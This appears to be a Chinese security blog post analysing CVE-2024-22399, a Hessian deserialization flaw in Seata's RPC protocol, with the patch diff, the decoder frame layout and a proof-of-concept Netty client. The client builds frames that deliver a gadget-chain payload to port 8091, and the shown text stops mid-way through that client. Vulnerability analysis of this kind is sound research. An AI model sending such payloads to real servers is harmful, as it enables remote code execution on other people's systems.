<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="stoocea" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  <meta name="description" content="time thicking away" />
  
  
  
  <title>
    
      CVE-2024-22399 Seata Hessian反序列化漏洞分析 
      
      
      |
    
     stoocea&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/4DF91FDE2543D52C6A4B04B2C784E859.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">stoocea</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">CVE-2024-22399 Seata Hessian反序列化漏洞分析</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2024-11-01 17:42:40
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/Seata/" title="Seata">
                    #Seata
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><a target="_blank" rel="noopener" href="https://www.oscs1024.com/hd/MPS-dhq6-1iyr">https://www.oscs1024.com/hd/MPS-dhq6-1iyr</a></p>
<blockquote>
<p>Seata用于服务端与客户端通信的RPC协议（默认8091端口）以及2.0.0开始实现的Raft协议消息均支持hessian格式，在2.1.0及1.8.1版本之前的Hessian反序列化操作校验不严格，自身安全校验HessianSerializerFactory只作用于serialize序列化过程。</p>
<p>攻击者可通过向Seata服务端发送恶意的hessian格式RPC数据，通过SwingLazyValue等利用链反序列化执行任意代码。</p>
</blockquote>
<p>光看描述能够确定是hessian反序列化引起的，然后有两个确定点，就是安全校验的是HessianSerializerFactory，那么黑名单以及一些检验应该都放在他这里了。但是这个检验机制在漏洞爆出来的时候只作用于serialize流程，unserialize的流程没有用到它。所以看diff的时候多注意这几个点。</p>
<p>(最后测试分析完回过头来看，这个版本是标的有问题的，至少我个人认为)</p>
<p>‍</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="0x01-sink点diff"><a href="#0x01-sink点diff" class="headerlink" title="0x01 sink点diff"></a>0x01 sink点diff</h2><p>先理一下hessian序列化和反序列化的逻辑。实际上我们写代码用hessian的这两个功能的时候，最多的就是hessian2input.readObject和writeObject，但是他们两个具体的功能实现本质上还是通过SerializerFactory的getDeseriazlier或者getSerializer获取到的er，调用其具体方法，就拿反序列化的过程来讲，比如MapDeserializer就是readMap方法来具体处理。默认自定义类的反序列化就是UnsafeDeserializer的readObject。了解了这些再去看diff</p>
<p>第一眼就看到了这个，这黑名单跟没打差不多，后续肯定还有绕过，不过看官方后续没有继续的CVE了，估计是把这个功能弃了，新版2.2.0甚至这个类打上了横杠。</p>
<p><img src="/images/seata/assets/image-20241030171201-sppjpbe.png" alt="image">​</p>
<p>然后是它自定义的hessian序列化处理器，在反序列化的时候，之前是没有调用input.setSerailzerFactory的，也就是说就是一个纯裸的hessian反序列化被打了。</p>
<p><img src="/images/seata/assets/image-20241030171311-h5k0ju2.png" alt="image">​</p>
<p>看到现在的话，其实漏洞复现就可以往上开始了，SerializerFactory设置对于hessian反序列化的影响我们之后再说。</p>
<p>‍</p>
<h2 id="0x02-向上调用寻找"><a href="#0x02-向上调用寻找" class="headerlink" title="0x02 向上调用寻找"></a>0x02 向上调用寻找</h2><h3 id="1x01-入口解析"><a href="#1x01-入口解析" class="headerlink" title="1x01 入口解析"></a>1x01 入口解析</h3><blockquote>
<p>Seata用于服务端与客户端通信的RPC协议（默认8091端口）以及2.0.0开始实现的Raft协议消息均支持hessian格式</p>
</blockquote>
<p>调用栈其实也不长，只是如果对相关知识不熟悉的话就会很长时间去理解和找资料（要补一下netty了），我们翻找一下官方文档：</p>
<p><a target="_blank" rel="noopener" href="https://seata.incubator.apache.org/zh-cn/blog/seata-rpc-multi-protocol02">https://seata.incubator.apache.org/zh-cn/blog/seata-rpc-multi-protocol02</a></p>
<p>8091端口开启了RPC协议通信,其实在官方文档也写到了<code>ProtocolV1Decoder</code>​的相关内容，相关RPC通信的过程最外面的一层处理就是encode和decode，<code>ProtocolV1Decoder/Encode</code>​是seata中自己定义的相关decode和encode的逻辑处理器，这里就能够在最后找到调用serializer的获取和相关deserialize的逻辑调用。</p>
<h2 id="0x03-poc构造"><a href="#0x03-poc构造" class="headerlink" title="0x03 poc构造"></a>0x03 poc构造</h2><p>这个部分的内容主要是写给自己看的，手动从头到尾构造poc，师傅们可以直接跳到该节的最后拿POC。</p>
<p>首先了解一下Seata中的RPC通信流程。分两个部分，一个是客户端在做的事，一个是服务端在做的事。</p>
<p>客户端：</p>
<ul>
<li>客户端首先通过通过Netty框架和SeataServer端<strong>建立起TCP连接</strong>。</li>
<li>之后开始<strong>请求封装</strong>。这一步也是我们poc里面做的事，请求主要包含必要元数据，消息类型，请求ID，请求头等。这里消息格式正确了才能被<code>ProtocolV1Decoder</code>​解析到decode方法。</li>
<li>之后开始数据编码，其实就是决定我们以何种形式传递信息，这里可以去看一下seata的源码serializer包，或者直接看<code>SerializerType</code>​中指定的支持数据类型。这个编码仅仅只是写一个标识符，我们具体的内容还是得自己构造，且格式能够对应的上。</li>
<li>还是通过netty框架发送给seata具体的信息接收端。</li>
</ul>
<p>服务端，也就是seata端：</p>
<ul>
<li>在客户端将数据通过netty的channel发送到8091端口，这个时候接收到信息，再经由netty分发到各个解码器，seata自定义解码器就包括了V1和V0两个版本，具体的使用可以查看官方文档。</li>
<li>本次用到的就是<code>ProtocolV1Decoder</code>​解码器，这个过程免不了反序列化。（所以这种中间件框架出洞很多时候都是在这种通信过程中必要的反序列化和序列化，具体该怎么体会，只能说我还缺点味）反序列化成seata可以识别的数据对象之后再交给seata核心处理器去处理了。</li>
<li>后续再将结果编码（序列化）成二进制形式，通过netty返回给客户端。</li>
</ul>
<p>‍</p>
<h3 id="1x01-请求封装数据构造"><a href="#1x01-请求封装数据构造" class="headerlink" title="1x01 请求封装数据构造"></a>1x01 请求封装数据构造</h3><p>在客户端的过程中提到过请求封装的过程，我觉得这是这个利用最难的地方，因为确实比较陌生。</p>
<h4 id="2x01-hesssian协议识别符"><a href="#2x01-hesssian协议识别符" class="headerlink" title="2x01 hesssian协议识别符"></a>2x01 hesssian协议识别符</h4><p>关键点倒是在创建Serializer的过程，这里是通过<code>SerializerType.getByCode</code>​方法获取的，根据就是rpcMessage中的Codec编码数据。</p>
<p><img src="/images/seata/assets/image-20241030204210-mzbyw7p.png" alt="image">​</p>
<p>我们跟进SerializeType就能够找到Hessian协议的相关字节为22</p>
<p><img src="/images/seata/assets/image-20241030204411-v2hg1b6.png" alt="image">​</p>
<p>确定了这点之后我们再反向去找其余字节如何构造。</p>
<h4 id="2x02-hessian序列化数据构造"><a href="#2x02-hessian序列化数据构造" class="headerlink" title="2x02 hessian序列化数据构造"></a>2x02 hessian序列化数据构造</h4><p>首先向上就是具体的hessian序列化数据是怎么接收到的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">bodyLength</span> <span class="operator">=</span> fullLength - headLength;</span><br><span class="line">           <span class="keyword">if</span> (bodyLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="type">byte</span>[] bs = <span class="keyword">new</span> <span class="title class_">byte</span>[bodyLength];</span><br><span class="line">               frame.readBytes(bs);</span><br><span class="line">               <span class="type">Compressor</span> <span class="variable">compressor</span> <span class="operator">=</span> CompressorFactory.getCompressor(compressorType);</span><br><span class="line">               bs = compressor.decompress(bs);</span><br><span class="line">               <span class="type">Serializer</span> <span class="variable">serializer</span> <span class="operator">=</span> SerializerServiceLoader.load(SerializerType.getByCode(rpcMessage.getCodec()));</span><br><span class="line">               rpcMessage.setBody(serializer.deserialize(bs));</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>总的就是根据bodyLength来算，full-head，整体的长度减去头部长度</p>
<p>但是这两个数据怎么来呢，在decode逻辑中有一段集体从frame数据段中read的操作。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">fullLength</span> <span class="operator">=</span> frame.readInt();</span><br><span class="line"><span class="type">short</span> <span class="variable">headLength</span> <span class="operator">=</span> frame.readShort();</span><br><span class="line"><span class="type">byte</span> <span class="variable">messageType</span> <span class="operator">=</span> frame.readByte();</span><br><span class="line"><span class="type">byte</span> <span class="variable">codecType</span> <span class="operator">=</span> frame.readByte();</span><br><span class="line"><span class="type">byte</span> <span class="variable">compressorType</span> <span class="operator">=</span> frame.readByte();</span><br><span class="line"><span class="type">int</span> <span class="variable">requestId</span> <span class="operator">=</span> frame.readInt();</span><br></pre></td></tr></table></figure>

<p>这里经过frame.readInt();之后就只有readHessian序列化数据的逻辑了，所以可以确定我们的Hessian序列化数据就是紧跟在requestId的写入操作之后。但是还有一个细节，如果这里headLength大于V1_HEAD_LENGTH，也就是16的话，就会还有一段处理<code>headMapLength</code>​的逻辑，这里还会有一段读取的逻辑，会污染序列化数据的读取，所以我们尽量让headLength为16即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">headMapLength</span> <span class="operator">=</span> headLength - ProtocolConstants.V1_HEAD_LENGTH;</span><br><span class="line"><span class="keyword">if</span> (headMapLength &gt; <span class="number">0</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>decodeFrame在正式读取那些关键数据之前还有会三段readByte数据的操作，version倒是没有用到，最前面两端byte都必须为<code>0xda</code>​，不然就会抛错</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      <span class="type">byte</span> <span class="variable">b0</span> <span class="operator">=</span> frame.readByte();</span><br><span class="line">      <span class="type">byte</span> <span class="variable">b1</span> <span class="operator">=</span> frame.readByte();</span><br><span class="line"><span class="type">byte</span> <span class="variable">version</span> <span class="operator">=</span> frame.readByte();</span><br></pre></td></tr></table></figure>

<p>其实上面所有的字节编写我们都能够通过分析对应的<code>ProtocolV1Encoder</code>​的逻辑就行，只不过最后的bodyByte需要我们自己构造上去。</p>
<h3 id="1x02-请求编码，也即最终POC"><a href="#1x02-请求编码，也即最终POC" class="headerlink" title="1x02 请求编码，也即最终POC"></a>1x02 请求编码，也即最终POC</h3><p>参考<code>ProtocolV1Encoder</code>​就行，分析activeMQ的经验，我估计之后这种中间件的洞都会用到。然后整体可以参考seata官方文档，或者直接GPT4问一个，包括两个部分，一个是<code>POCByteEncoder</code>​的部分，也就是我们提到的请求封装步骤的具体实现类。还有一个是用来发送这段message的处理器，<code>PocSourceSender</code>​。</p>
<p>先看各自的逻辑，<code>POCByteEncoder</code>​：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">       <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext channelHandlerContext, Object msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">           <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> RpcMessage) &#123;</span><br><span class="line">               <span class="type">RpcMessage</span> <span class="variable">rpcMessage</span> <span class="operator">=</span> (RpcMessage) msg;</span><br><span class="line"></span><br><span class="line">               <span class="type">int</span> <span class="variable">fullLength</span> <span class="operator">=</span> ProtocolConstants.V1_HEAD_LENGTH;</span><br><span class="line">               <span class="type">int</span> <span class="variable">headLength</span> <span class="operator">=</span> ProtocolConstants.V1_HEAD_LENGTH;</span><br><span class="line">			<span class="comment">//我们在PocSourceSender中构造的message对象直接调用setCodec即可，这里会自动读取出来</span></span><br><span class="line">               <span class="type">byte</span> <span class="variable">messageType</span> <span class="operator">=</span> rpcMessage.getMessageType();</span><br><span class="line">               out.writeBytes(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">38</span>, -<span class="number">38</span>&#125;);</span><br><span class="line">               out.writeByte(ProtocolConstants.VERSION);</span><br><span class="line">               <span class="comment">// full Length(4B) and head length(2B) will fix in the end.</span></span><br><span class="line">               out.writerIndex(out.writerIndex() + <span class="number">6</span>);</span><br><span class="line">               out.writeByte(messageType);</span><br><span class="line">               out.writeByte(rpcMessage.getCodec());</span><br><span class="line">               out.writeByte(rpcMessage.getCompressor());</span><br><span class="line">               out.writeInt(rpcMessage.getId());</span><br><span class="line"></span><br><span class="line">               <span class="comment">// direct write head with zero-copy</span></span><br><span class="line">               Map&lt;String, String&gt; headMap = rpcMessage.getHeadMap();</span><br><span class="line">               <span class="keyword">if</span> (headMap != <span class="literal">null</span> &amp;&amp; !headMap.isEmpty()) &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">headMapBytesLength</span> <span class="operator">=</span> HeadMapSerializer.getInstance().encode(headMap, out);</span><br><span class="line">                   headLength += headMapBytesLength;</span><br><span class="line">                   fullLength += headMapBytesLength;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">               <span class="type">byte</span>[] bodyBytes = <span class="literal">null</span>;</span><br><span class="line">               <span class="keyword">if</span> (messageType != ProtocolConstants.MSGTYPE_HEARTBEAT_REQUEST</span><br><span class="line">                       &amp;&amp; messageType != ProtocolConstants.MSGTYPE_HEARTBEAT_RESPONSE) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                   <span class="comment">//唯一改的地方，后面我会紧跟一段PocByte的逻辑，这里为了完整性就不全部写出来了</span></span><br><span class="line">                   bodyBytes=<span class="keyword">new</span> <span class="title class_">SwingLazyValuePOC</span>().getPocbyte();</span><br><span class="line"></span><br><span class="line">                   <span class="type">Compressor</span> <span class="variable">compressor</span> <span class="operator">=</span> CompressorFactory.getCompressor(rpcMessage.getCompressor());</span><br><span class="line">                   bodyBytes = compressor.compress(bodyBytes);</span><br><span class="line">                   fullLength += bodyBytes.length;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">               out.writeBytes(bodyBytes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">               <span class="comment">// fix fullLength and headLength</span></span><br><span class="line">               <span class="type">int</span> <span class="variable">writeIndex</span> <span class="operator">=</span> out.writerIndex();</span><br><span class="line">               out.writerIndex(writeIndex - fullLength + <span class="number">3</span>);</span><br><span class="line">               out.writeInt(fullLength);</span><br><span class="line">               out.writeShort(headLength);</span><br><span class="line">               out.writerIndex(writeIndex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not support this class:&quot;</span> + msg.getClass());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>几乎就是照搬<code>V1Encoder</code>​的encode方法内容，唯一一个需要改的内容是我们POC的字节写入，这里可以单独开一个工具类，然后写一个生成方法。由于seata对应的版本下，hessian的版本是4.0.63，之前nacos的jraft hessian反序列化中就遇到了这个问题，hessian内置了黑名单，导致Runtime被识别成了HashMap类型，而无法调用到exec方法。这里需要采取其他方法进行利用。比如我poc这里写的采用<code>org.springframework.util.SerializationUtils</code>​的二次反序列化打法。由于seata自带springboot的依赖，所以这个类是可以打的，并且这种中间件很多都会带spring，结合spring原生反序列化链就可以实现利用了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> POC.HessianWithJDK.Hessian_Spring;</span><br><span class="line"><span class="keyword">import</span> io.netty.bootstrap.Bootstrap;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.nio.NioSocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.MessageToByteEncoder;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.compressor.Compressor;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.compressor.CompressorFactory;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.protocol.RpcMessage;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.rpc.netty.v1.HeadMapSerializer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SeataHessianClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SeataHessianClient</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POCByteEncoder</span> <span class="keyword">extends</span> <span class="title class_">MessageToByteEncoder</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext channelHandlerContext, Object msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> RpcMessage) &#123;</span><br><span class="line">                <span class="type">RpcMessage</span> <span class="variable">rpcMessage</span> <span class="operator">=</span> (RpcMessage)msg;</span><br><span class="line">                <span class="type">int</span> <span class="variable">fullLength</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">headLength</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line">                <span class="type">byte</span> <span class="variable">messageType</span> <span class="operator">=</span> rpcMessage.getMessageType();</span><br><span class="line">                out.writeBytes(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">38</span>, -<span class="number">38</span>&#125;);</span><br><span class="line">                out.writeByte(<span class="number">1</span>);</span><br><span class="line">                out.writerIndex(out.writerIndex() + <span class="number">6</span>);</span><br><span class="line">                out.writeByte(messageType);</span><br><span class="line">                out.writeByte(rpcMessage.getCodec());</span><br><span class="line">                out.writeByte(rpcMessage.getCompressor());</span><br><span class="line">                out.writeInt(rpcMessage.getId());</span><br><span class="line">                Map&lt;String, String&gt; headMap = rpcMessage.getHeadMap();</span><br><span class="line">                <span class="keyword">if</span> (headMap != <span class="literal">null</span> &amp;&amp; !headMap.isEmpty()) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">headMapBytesLength</span> <span class="operator">=</span> HeadMapSerializer.getInstance().encode(headMap, out);</span><br><span class="line">                    headLength += headMapBytesLength;</span><br><span class="line">                    fullLength += headMapBytesLength;</span><br><span class="line">                &#125;</span><br><span class="line">            </span><br><span class="line">                <span class="type">byte</span>[] bodyBytes = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (messageType != <span class="number">3</span> &amp;&amp; messageType != <span class="number">4</span>) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] stream = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="type">byte</span>[] tmpbyte=<span class="keyword">new</span> <span class="title class_">Hessian_Spring</span>().getPocbyte();</span><br><span class="line">                        stream=tmpbyte;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">                        System.out.println(var7);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    bodyBytes = stream;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Compressor</span> <span class="variable">compressor</span> <span class="operator">=</span> CompressorFactory.getCompressor(rpcMessage.getCompressor());</span><br><span class="line">                    bodyBytes = compressor.compress(bodyBytes);</span><br><span class="line">                    fullLength += bodyBytes.length;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (bodyBytes != <span class="literal">null</span>) &#123;</span><br><span class="line">                    out.writeBytes(bodyBytes);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">writeIndex</span> <span class="operator">=</span> out.writerIndex();</span><br><span class="line">                out.writerIndex(writeIndex - fullLength + <span class="number">3</span>);</span><br><span class="line">                out.writeInt(fullLength);</span><br><span class="line">                out.writeShort(headLength);</span><br><span class="line">                out.writerIndex(writeIndex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not support this class:&quot;</span> + msg.getClass());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PocSourceSender</span> <span class="keyword">extends</span> <span class="title class_">ChannelInboundHandlerAdapter</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelActive</span><span class="params">(ChannelHandlerContext ctx)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="comment">// 连接成功时发送消息</span></span><br><span class="line">            <span class="type">RpcMessage</span> <span class="variable">rpcMessage</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RpcMessage</span>();</span><br><span class="line">            <span class="comment">//hessian协议对应的编码</span></span><br><span class="line">            rpcMessage.setCodec((<span class="type">byte</span>) <span class="number">22</span>);</span><br><span class="line">            /这个无所谓，反正接收序列化字节的东西还是encoder里面定义的</span><br><span class="line">            rpcMessage.setBody(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">            ctx.writeAndFlush(rpcMessage);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">group</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 